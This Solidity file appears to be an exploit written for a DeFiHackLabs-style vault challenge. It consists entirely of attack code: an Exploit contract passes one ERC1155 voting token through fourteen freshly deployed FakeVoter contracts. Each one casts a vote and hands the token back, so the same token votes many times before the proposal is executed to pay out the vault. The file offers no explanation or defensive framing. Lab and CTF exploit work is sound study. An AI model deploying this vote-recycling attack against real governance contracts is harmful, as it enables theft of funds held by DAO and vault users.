// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

interface IDeFiHackLabsVault {
    struct Proposal {
        address receiver;
        bool executed;
        uint256 amount;
    }

    function hightestVote() external returns (uint256);
    function createProposal(Proposal calldata proposal) external payable returns (uint256 id);
    function vote(uint256 id) external;
    function execute(uint256 id) external;
}

contract FakeVoter is Ownable {
    constructor(address _votingToken) Ownable(msg.sender) {
        IERC1155(_votingToken).setApprovalForAll(owner(), true);
    }

    function vote(address vault, uint256 id) external {
        IDeFiHackLabsVault(vault).vote(id);
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata data)
        external
        pure
        returns (bytes4)
    {
        return FakeVoter.onERC1155Received.selector;
    }
}

contract Exploit is Ownable {
    address private immutable votingToken;
    address private immutable vault;
    FakeVoter private fakeVoter;

    constructor(address _votingToken, address _vault) Ownable(msg.sender) {
        votingToken = _votingToken;
        vault = _vault;
    }

    function exploit(uint256 id) external onlyOwner {
        for (uint256 i = 0; i < 14; ++i) {
            fakeVoter = new FakeVoter(address(votingToken));
            IERC1155(votingToken).safeTransferFrom(address(this), address(fakeVoter), 1, 1, "");
            fakeVoter.vote(vault, id);
            IERC1155(votingToken).safeTransferFrom(address(fakeVoter), address(this), 1, 1, "");
        }

        IDeFiHackLabsVault(vault).execute(id);
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return Exploit.onERC1155Received.selector;
    }
}
